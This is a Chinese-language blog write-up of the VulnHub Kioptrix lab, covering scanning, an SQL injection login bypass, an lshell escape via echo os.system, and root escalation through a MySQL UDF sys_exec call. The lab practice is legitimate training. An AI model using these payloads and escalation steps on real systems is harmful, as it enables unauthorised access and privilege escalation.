<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>vulnhub-kioptrix_level 1.3 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>vulnhub-kioptrix_level 1.3</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-24T10:52:10.155Z" id="date"> 2023-09-24</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-25T11:19:12.079Z" id="updated"> 2023-09-25</time></div></span><br><span>文章总字数: <div class="control">3.8k</div></span><br><span>预计阅读时间: <div class="control">16 分钟</div></span></div></div><hr><div id="post-content"><h1>0x01 靶场信息</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">地址：https://www.vulnhub.com/entry/kioptrix-level-1-1,22/<br>发布日期：2010 年 2 月 17 日<br>难度：容易<br>目标：获取root shell<br><br>描述：This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.<br><br>Source: http://www.kioptrix.com/blog/?page_id=135<br>Source: http://www.kioptrix.com/blog/?p=49<br></code></pre></td></tr></table></figure>
<p>![image-20230924185658114](kioptrix_level 1.3/image-20230924185658114.png)</p>
<p>这里在搭建也是费点脑子，这里如上图下载好rar包之后发现只有一个vmdx的文件，这里需要我们先在虚拟机上创建一个空的</p>
<p>![image-20230924185745215](kioptrix_level 1.3/image-20230924185745215.png)</p>
<p>![image-20230924185756615](kioptrix_level 1.3/image-20230924185756615.png)</p>
<p>这里选择其他即可</p>
<p>![image-20230924185811593](kioptrix_level 1.3/image-20230924185811593.png)</p>
<p>这里放在合适的地方，安装好后进入虚拟机设置中，将原先的硬盘删除掉，换成我们下载好的vmdx文件即可</p>
<p>![image-20230924185924521](kioptrix_level 1.3/image-20230924185924521.png)</p>
<p>下载好打开即可，可能再打开的时候会报错，他会提示让我们换成如下图的配置</p>
<p>![image-20230924190011738](kioptrix_level 1.3/image-20230924190011738.png)</p>
<p>我们照做即可</p>
<h1>0x02 信息收集</h1>
<h2 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netdiscover -r 192.168.17.0/24  <br></code></pre></td></tr></table></figure>
<p>![image-20230924191700887](kioptrix_level 1.3/image-20230924191700887.png)</p>
<p>那目标机就是<code>192.168.17.145</code>了</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap -sS -sV -A -p 1-65535 192.168.17.143<br></code></pre></td></tr></table></figure>
<p>![image-20230924192157892](kioptrix_level 1.3/image-20230924192157892.png)</p>
<p>可以看到有如上四个端口的开启，我们先访问80看看</p>
<p>![image-20230924192223848](kioptrix_level 1.3/image-20230924192223848.png)</p>
<p>如图是一个登录平台，我们先看一下web目录</p>
<h2 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dirsearch -u &quot;http://192.168.17.145&quot; -x 400-599 -t 50<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">Target: http:<span class="hljs-comment">//192.168.17.145/</span><br><br>[<span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">29</span>] Starting: <br>[<span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">51</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">109</span>B  - /checklogin<br>[<span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">109</span>B  - /checklogin.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">54</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">298</span>B  - /database.sql<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">00</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">933</span>B  - /images/<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">01</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">356</span>B  - /images  -&gt;  http:<span class="hljs-comment">//192.168.17.145/images/</span><br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">02</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /index.php/login/<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">02</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /index<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">05</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - /logout  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">05</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - /logout.php  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">05</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - /logout/  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.jsp  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.aspx  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/logon  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.rb  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.html  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/admin.asp  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.py  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.php  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.js  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member.php  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/signin  -&gt;  index.php<br>[<span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">07</span>] <span class="hljs-number">302</span> -  <span class="hljs-number">220</span>B  - /member/login.asp  -&gt;  index.php<br></code></pre></td></tr></table></figure>
<p>测试一番发现如下信息：</p>
<p>database.sql：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `members` (<br>`id` <span class="hljs-type">int</span>(<span class="hljs-number">4</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> auto_increment,<br>`username` <span class="hljs-type">varchar</span>(<span class="hljs-number">65</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>`password` <span class="hljs-type">varchar</span>(<span class="hljs-number">65</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-keyword">PRIMARY</span> KEY (`id`)<br>) TYPE<span class="hljs-operator">=</span>MyISAM AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">2</span> ;<br><br><span class="hljs-comment">-- </span><br><span class="hljs-comment">-- Dumping data for table `members`</span><br><span class="hljs-comment">-- 	</span><br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `members` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;john&#x27;</span>, <span class="hljs-string">&#x27;1234&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>估计是sql注入了</p>
<h2 id="web网站指纹扫描"><a href="#web网站指纹扫描" class="headerlink" title="web网站指纹扫描"></a>web网站指纹扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">whatweb http://192.168.17.145<br></code></pre></td></tr></table></figure>
<p>![image-20230924193046254](kioptrix_level 1.3/image-20230924193046254.png)</p>
<p>此处似乎没什么重要信息，但回过头来看了看sql泄露的信息</p>
<h1>0x03 漏洞发现及利用</h1>
<h2 id="万能密码登录获取用户信息"><a href="#万能密码登录获取用户信息" class="headerlink" title="万能密码登录获取用户信息"></a>万能密码登录获取用户信息</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">INSERT INTO `members` VALUES (1, &#x27;john&#x27;, &#x27;1234&#x27;);<br></code></pre></td></tr></table></figure>
<p>我瞬间就认为这可能是登录页面的信息，但试了试没啥用，接着便没思路了，于是看了wp发现是我的dirsearch扫的不行，使用kali自带的dirb竟然还能扫到一个john后缀的url。。。。话不多说我们访问看看</p>
<p>![image-20230924195229960](kioptrix_level 1.3/image-20230924195229960.png)</p>
<p>![image-20230924195250034](kioptrix_level 1.3/image-20230924195250034.png)</p>
<p>![image-20230924195507516](kioptrix_level 1.3/image-20230924195507516.png)</p>
<p>好吧没什么卵用，接着wp说尝试弱口令，但我之前也尝试了却没成功，还是怪自己经验少而且没耐心吧┭┮﹏┭┮</p>
<p>然后我跟着教程走，发现还是不行？？？结果换一个浏览器就好了，真实玄学，看来又多了一个经验</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">john<br>&#x27;or&#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>
<p>我们输入如上信息，即可得到用户信息</p>
<p>![image-20230924200000467](kioptrix_level 1.3/image-20230924200000467.png)</p>
<p>接下来我又不知道干嘛了，要不是看wp我又忘了可以尝试一下ssh连接的。。。</p>
<p>![image-20230924200233909](kioptrix_level 1.3/image-20230924200233909.png)</p>
<p>但成功登陆之后奇怪的是什么命令也不能执行。。。，仔细一看发现这里似乎是自定义了一些命令符</p>
<p>![image-20230924200358200](kioptrix_level 1.3/image-20230924200358200.png)</p>
<p>如图输入?或者help能查看可以使用什么命令，不过 还是很鸡肋，我用遍了也不知道有啥有效信息，看了wp发现又是知识盲区了，他这里采用了一种提权方法，其实我也应该往这里想的，即使我不会，但得有想法</p>
<h2 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql-udf-提权"></a>mysql-udf 提权</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>) <span class="hljs-comment">#输出bash命令行</span><br><span class="hljs-built_in">cd</span> /var/www<br><span class="hljs-built_in">cat</span> checklogin.php<br></code></pre></td></tr></table></figure>
<p>![image-20230924201147686](kioptrix_level 1.3/image-20230924201147686.png)</p>
<p>因为菜的缘故，我不理解他echo命令的操作原理，于是GPT问了一番，果然AI就是好，百度没找到的，我一下子就透彻了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这行代码看起来是用Python的`os.system`函数在Linux系统中执行了一个命令`/bin/bash`。让我来解释一下：<br><br>1. `echo`: 这是一个Linux命令，用于在终端中打印文本。在这里，它被用作一个外部命令，会打印`os.system(&quot;/bin/bash&quot;)`这个字符串到终端。<br><br>2. `os.system(&quot;/bin/bash&quot;)`: 这部分是Python代码，它调用了`os.system`函数，该函数用于在操作系统中执行外部命令。在这里，传递给`os.system`函数的参数是`&quot;/bin/bash&quot;`，这是一个Linux系统中的命令解释器，也就是Bash Shell。<br><br>综合起来，这行代码的作用是在Linux系统中打印字符串`os.system(&quot;/bin/bash&quot;)`到终端，并尝试执行`/bin/bash`，也就是启动一个新的Bash Shell进程。这样，如果运行这段代码，你将会看到该字符串被打印到终端，并且你会进入一个新的Bash Shell，可以在其中执行其他命令和操作。请注意，执行这段代码需要足够的权限，因为它尝试启动一个新的Shell。这种代码使用得当，可以用于调用其他系统命令，但也需要小心，以免滥用或造成安全问题。<br></code></pre></td></tr></table></figure>
<p>以上为GPT回答，总的来说，echo命令行调用了system命令来执行/bin/bash，于是启动了一个新的shell进程，恰好启动之后我们便可以使用更多的linux系统命令了—理解止步于此，请佬们嘴下留情┭┮﹏┭┮</p>
<p>这里 跟着步骤看一个check源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-variable">$host</span>=<span class="hljs-string">&quot;localhost&quot;</span>; <span class="hljs-comment">// Host name</span><br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>; <span class="hljs-comment">// Mysql username</span><br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// Mysql password</span><br><span class="hljs-variable">$db_name</span>=<span class="hljs-string">&quot;members&quot;</span>; <span class="hljs-comment">// Database name</span><br><span class="hljs-variable">$tbl_name</span>=<span class="hljs-string">&quot;members&quot;</span>; <span class="hljs-comment">// Table name</span><br><br><span class="hljs-comment">// Connect to server and select databse.</span><br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$host</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$username</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$password</span>&quot;</span>)<span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cannot connect&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$db_name</span>&quot;</span>)<span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cannot select DB&quot;</span>);<br><br><span class="hljs-comment">// Define $myusername and $mypassword</span><br><span class="hljs-variable">$myusername</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;myusername&#x27;</span>];<br><span class="hljs-variable">$mypassword</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mypassword&#x27;</span>];<br><br><span class="hljs-comment">// To protect MySQL injection (more detail about MySQL injection)</span><br><span class="hljs-variable">$myusername</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$myusername</span>);<br><span class="hljs-comment">//$mypassword = stripslashes($mypassword);</span><br><span class="hljs-variable">$myusername</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$myusername</span>);<br><span class="hljs-comment">//$mypassword = mysql_real_escape_string($mypassword);</span><br><br><span class="hljs-comment">//$sql=&quot;SELECT * FROM $tbl_name WHERE username=&#x27;$myusername&#x27; and password=&#x27;$mypassword&#x27;&quot;;</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM <span class="hljs-subst">$tbl_name</span> WHERE username=&#x27;<span class="hljs-subst">$myusername</span>&#x27; and password=&#x27;<span class="hljs-subst">$mypassword</span>&#x27;&quot;</span>);<br><span class="hljs-comment">//$result=mysql_query($sql);</span><br><br><span class="hljs-comment">// Mysql_num_row is counting table row</span><br><span class="hljs-variable">$count</span>=<span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-comment">// If result matched $myusername and $mypassword, table row must be 1 row</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>!=<span class="hljs-number">0</span>)&#123;<br><span class="hljs-comment">// Register $myusername, $mypassword and redirect to file &quot;login_success.php&quot;</span><br>        <span class="hljs-title function_ invoke__">session_register</span>(<span class="hljs-string">&quot;myusername&quot;</span>);<br>        <span class="hljs-title function_ invoke__">session_register</span>(<span class="hljs-string">&quot;mypassword&quot;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:login_success.php?username=<span class="hljs-subst">$myusername</span>&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong Username or Password&quot;</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;&lt;form method=&quot;link&quot; action=&quot;index.php&quot;&gt;&lt;input type=submit value=&quot;Try Again&quot;&gt;&lt;/form&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>可以看到上述代码只对username做了参数过滤，并没有限制password，这也是万能密码成功的原因，并且我们也可以看到数据库配置信息，看了wp，发现接下来就可以想到mysql数据库提权了</p>
<p>由于不熟悉mysql命令，就cv过来了</p>
<p>![image-20230924202012411](kioptrix_level 1.3/image-20230924202012411.png)</p>
<p>这里登录的时候密码默认为空，接下来佬又毫无理由的输入了一下命令，┭┮﹏┭┮</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p<br><span class="hljs-keyword">select</span> sys_exec(&quot;usermod -aG admin john&quot;);<br>exit<br></code></pre></td></tr></table></figure>
<p>以下是GPT 回答</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select: 这是一个 SQL 查询语句的起始部分，表示你要执行一个查询操作。通常，select 用于从数据库中检索数据。<br><br>sys_exec(&quot;usermod -aG admin john&quot;): 这是一个 SQL 查询中的函数调用，其中调用了一个名为 sys_exec 的自定义函数，并传递了一个参数 &quot;usermod -aG admin john&quot; 给该函数。根据函数名和参数的形式，可以推断出这个函数的作用是执行系统命令。<br><br>&quot;usermod -aG admin john&quot; 是一个 Linux 系统命令，用于将用户 john 添加到 admin 用户组。这个命令通常用于管理用户和用户组的权限。<br>如果你的数据库支持并配置了 sys_exec 函数，并且具有足够的权限来执行系统命令，那么执行这个 SQL 查询将尝试执行 usermod -aG admin john 命令，将用户 john 添加到 admin 用户组中。<br></code></pre></td></tr></table></figure>
<p>我们发现执行如上命令便可以将john加入到admin用户组了</p>
<p>![image-20230924202337538](kioptrix_level 1.3/image-20230924202337538.png)</p>
<p>顺便解释一下上述命令各个参数的含义，我也复习复习，GPT回答：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">当解释命令 `usermod -aG admin john` 时，我们需要分解和解释各个参数的含义：<br><br>1. `usermod`: 这是一个 Linux 命令，用于修改用户帐户的属性。它的主要功能是管理用户帐户的属性，例如更改用户名、密码、家目录等。<br><br>2. `-aG`: 这是 `usermod` 命令的选项和参数，具体含义如下：<br><br>   - `-a`: 这个选项表示追加（append）。当与 `-G` 选项一起使用时，它指示将用户添加到一个或多个附加的用户组中，而不会将其从其他组中删除。如果省略了 `-a` 选项，用户将被从其他组中移除，并且只会属于新指定的组。<br><br>   - `-G admin`: 这个部分表示将用户添加到名为 `admin` 的用户组中。在 Linux 中，用户可以同时属于一个或多个用户组。这个命令将用户 `john` 添加到 `admin` 用户组，这可能用于授予用户 `john` 某些管理员权限或访问某些系统资源的权限。<br><br>3. `john`: 这是要修改的用户的用户名。在这种情况下，`usermod` 命令将对用户名为 `john` 的用户执行操作。<br><br>综合起来，这个命令的含义是将用户 `john` 添加到 `admin` 用户组，而不会从任何其他组中删除他。这通常用于管理用户的权限，以便他可以访问 `admin` 组的资源或执行需要 `admin` 组权限的操作，而不影响其在其他组的成员资格。<br></code></pre></td></tr></table></figure>
<h2 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到flag</h2>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo su root <br>密码：MyNameIsJohn<br>cd <span class="hljs-operator">~</span><br>cat congrats.txt<br></code></pre></td></tr></table></figure>
<p>![image-20230924202451357](kioptrix_level 1.3/image-20230924202451357.png)</p>
<h1>0x04 靶场总结</h1>
<h2 id="靶场echo命令探索"><a href="#靶场echo命令探索" class="headerlink" title="靶场echo命令探索"></a>靶场echo命令探索</h2>
<p>本着对知识的渴望与对自己学习的负责，我继续搜寻了上述<code>echo os.system(&quot;/bin/bash&quot;)</code>的含义，功夫不负有心人，我发现在此次靶场环境中，之所以当前用户使用的命令极其有限，是因为他处于一个lshell的环境，看这意思应该是limit shell</p>
<p>对其简单的介绍：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Linux受限shell软件lshell限制用户行为：<br>有时我们需要限制登录到Linux系统用户的行为，最简单的办法莫过于限制其所能执行的命令。<br>Lshell是另一款可以实现这个功能的软件，是由Python编写。<br></code></pre></td></tr></table></figure>
<p>接着搜了半天如何&quot;突破受限制的shell环境&quot;发现都没有包含上述方法，也就放弃了，只需将此方法记住吧。</p>
<h2 id="nikto漏扫初识"><a href="#nikto漏扫初识" class="headerlink" title="nikto漏扫初识"></a>nikto漏扫初识</h2>
<p>在这里我发现有篇文章用的是nikto方法，这里我也没接触过，于是简单了解了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Nikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto使用Perl语言编写运行，Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等.<br></code></pre></td></tr></table></figure>
